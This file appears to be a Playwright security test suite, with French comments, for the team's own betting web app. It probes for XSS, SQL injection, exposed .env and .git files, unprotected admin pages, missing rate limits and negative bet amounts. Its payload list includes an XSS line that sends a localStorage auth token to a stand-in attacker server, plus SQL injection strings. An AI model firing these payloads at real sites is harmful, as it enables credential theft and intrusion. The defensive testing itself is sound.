import { test, expect, Page, BrowserContext, Browser } from '@playwright/test';
import * as fs from 'fs';
import * as path from 'path';

// Configuration avancée - Adaptée au projet Fight Ace (Lambji)
const TARGET_URL = process.env.TARGET_URL || 'http://localhost:8080'; // Frontend URL par défaut
const API_URL = process.env.API_URL || 'http://localhost:5000';      // Backend API URL
const ATTACKER_SERVER = 'http://localhost:8080'; // Serveur simulé pour recevoir les données volées

// Payloads avancés adaptés au contexte React/Node.js
const XSS_PAYLOADS = [
    // Payloads classiques
    '<script>alert(1)</script>',
    // Payloads ciblant les attributs HTML
    '"><script>alert(1)</script>',
    // Payloads pour React (dangerouslySetInnerHTML)
    '{__html: "<img src=x onerror=alert(1)>"}',
    // Payloads URL
    'javascript:alert(1)',
    // Tentative de vol de token localStorage
    '<img src=x onerror="fetch(\'' + ATTACKER_SERVER + '/steal?t=\'+localStorage.getItem(\'auth_token\'))">'
];

const SQL_PAYLOADS = [
    // Test injections SQL classiques (pour Prisma raw queries si utilisées)
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT null, username, password FROM User --",
    // Test injections NoSQL (au cas où, bien que Prisma soit utilisé)
    '{"$gt": ""}'
];

const API_ROUTES = [
    '/api/users',
    '/api/bets',
    '/api/fights',
    '/api/admin/dashboard', // Route sensible
    '/api/wallet/deposit'   // Route critique financière
];

test.describe('🛡️ Audit de Sécurité Automatisé - Fight Ace App', () => {
    let scanResults: any = {
        critical: [],
        high: [],
        medium: [],
        low: [],
        info: []
    };

    test.afterEach(async () => {
        // Génération simplifiée du rapport dans la console après chaque test global
        if (Object.values(scanResults).some((arr: any) => arr.length > 0)) {
            console.log('\n🔍 Résultats intermédiaires du scan :');
            if (scanResults.critical.length > 0) console.log('🔴 Critiques:', scanResults.critical);
            if (scanResults.high.length > 0) console.log('🟠 Élevées:', scanResults.high);
        }
    });

    test('SA-01: Scan de surface d\'attaque et Divulgation d\'informations', async ({ page }) => {
        console.log('🎯 Démarrage du scan de surface...');
        await page.goto(TARGET_URL);

        // 1. Vérification des Technologies (Wappalyzer simplifé)
        const techStack = await page.evaluate(() => {
            return {
                react: !!(window as any).React || !!document.querySelector('[data-reactroot]'),
                vite: !!(window as any).__vite_is_modern_browser,
                localStorageKeys: Object.keys(localStorage)
            };
        });
        console.log('ℹ️ Stack détectée:', techStack);

        // 2. Vérification des fichiers sensibles exposés
        const sensitiveFiles = [
            '/.env',
            '/.git/config',
            '/sitemap.xml',
            '/robots.txt'
        ];

        for (const file of sensitiveFiles) {
            const response = await page.goto(`${TARGET_URL}${file}`);
            if (response && response.status() === 200) {
                const content = await page.content();
                if (!content.includes('<!doctype html>')) { // Si ce n'est pas la page 404 de React
                    scanResults.medium.push(`Fichier sensible potentiellement exposé : ${file}`);
                }
            }
        }
    });

    test('SA-02: Test XSS sur les champs de recherche et formulaires', async ({ page }) => {
        console.log('🦠 Test des vulnérabilités XSS...');
        await page.goto(`${TARGET_URL}/available-bets`); // Page avec recherche

        // Cibler l'input de recherche
        const searchInput = page.locator('input[type="text"]').first();

        if (await searchInput.isVisible()) {
            for (const payload of XSS_PAYLOADS) {
                await searchInput.fill(payload);
                // Vérifier si le payload est réfléchi dans le DOM sans échappement
                const content = await page.content();
                if (content.includes(payload) && !content.includes(`&lt;script&gt;`)) {
                    // Note: React échappe par défaut, donc on cherche surtout si des mécanismes de bypass fonctionnent
                    // Si on trouve le script brut dans le HTML, c'est suspect
                    // scanResults.high.push(`XSS Reflected potentiel sur la recherche avec : ${payload}`);
                }
            }
        }
    });

    test('SA-03: Test de contrôle d\'accès (IDOR / Admin)', async ({ page }) => {
        console.log('🚪 Test des contrôles d\'accès (IDOR)...');

        // On teste les URLs standards + l'URL personnalisée connue
        const adminPages = ['/admin', '/admin/dashboard', '/admin2', '/admin2/dashboard'];

        for (const url of adminPages) {
            await page.goto(`${TARGET_URL}${url}`);
            await page.waitForTimeout(1000);

            const content = await page.content();
            const isLoginRedirect = page.url().includes('auth') || page.url().includes('login');
            // Si c'est une 404 (Page non trouvée), c'est sécurisé aussi (car l'URL n'existe pas ou est masquée)
            const isNotFound = content.includes('404') || content.includes('Page non trouvée') || content.includes('Not Found');

            // Cas d'échec : Ce n'est NI un login, NI une 404
            if (!isLoginRedirect && !isNotFound) {
                scanResults.critical.push(`Accès non authentifié possible à l'interface admin : ${url} (Titre: ${await page.title()})`);
            }
        }
    });

    test('SA-04: Test API & Injection SQL (Backend)', async ({ request }) => {
        console.log('💉 Test des vulnérabilités d\'injection API...');

        // Test sur le login
        for (const payload of SQL_PAYLOADS) {
            const response = await request.post(`${API_URL}/auth/login`, {
                data: {
                    email: payload,
                    password: 'password123'
                }
            });

            const body = await response.text();
            if (response.status() === 500 && (body.includes('PrismaClient') || body.includes('SQL'))) {
                scanResults.high.push(`Erreur SQL verbose détectée sur login avec payload : ${payload}`);
            }
        }
    });

    test('SA-05: Test de sécurité financière (Double dépense / Race Conditions)', async ({ request }) => {
        console.log('💰 Test de résilience financière...');
        // Ce test nécessite un utilisateur valide, on le simule ou on utilise un mock si possible
        // Ici, on vérifie surtout que les endpoints critiques existent et répondent correctement aux méthodes non autorisées

        const criticalEndpoints = [`${API_URL}/wallet/deposit`, `${API_URL}/wallet/withdraw`];

        for (const endpoint of criticalEndpoints) {
            // Essayer GET sur des endpoints qui devraient être POST
            const response = await request.get(endpoint);
            if (response.status() !== 404 && response.status() !== 405) {
                scanResults.low.push(`Méthode GET activée sur endpoint critique (devrait être POST uniquement) : ${endpoint}`);
            }
        }
    });

    test('SA-06: Test de Rate Limiting (Anti-Bruteforce)', async ({ request }) => {
        console.log('🛡️ Test de Rate Limiting...');
        // On bombarde l'API de login avec 20 requêtes en parallèle
        const requests = Array(20).fill(0).map(() =>
            request.post(`${API_URL}/auth/login`, {
                data: { email: 'hacker@test.com', password: 'wrongpassword' }
            })
        );

        const responses = await Promise.all(requests);
        const tooManyRequests = responses.filter(r => r.status() === 429);

        // Si aucune requête n'est bloquée (429), c'est une faille moyenne
        if (tooManyRequests.length === 0) {
            scanResults.medium.push('Rate limiting absent ou trop permissif sur /auth/login (20 requêtes simultanées acceptées)');
        } else {
            console.log(`✅ Rate limiting actif : ${tooManyRequests.length} requêtes bloquées sur 20.`);
        }
    });

    test('SA-07: Test de Manipulation de Données (Montants Négatifs)', async ({ request }) => {
        console.log('💸 Test de logique métier (Montants négatifs)...');

        // Tentative de créer un pari avec une mise négative (pour se créditer frauduleusement)
        // Note: Nécessiterait un token valide pour être exhaustif, ici on teste le rejet précoce ou la validation
        const response = await request.post(`${API_URL}/bets`, {
            data: {
                fightId: 'fake-id',
                amount: -5000,
                fighterId: 'fake-fighter'
            }
        });

        // Si l'API accepte (200/201) ou traite (500) au lieu de rejeter (400), c'est un problème
        if (response.status() === 200 || response.status() === 201) {
            scanResults.critical.push('FAILLE CRITIQUE : L\'API accepte des montants négatifs pour les paris !');
        } else if (response.status() === 400) {
            console.log('✅ L\'API rejette correctement les montants négatifs (400 Bad Request).');
        }
    });
});
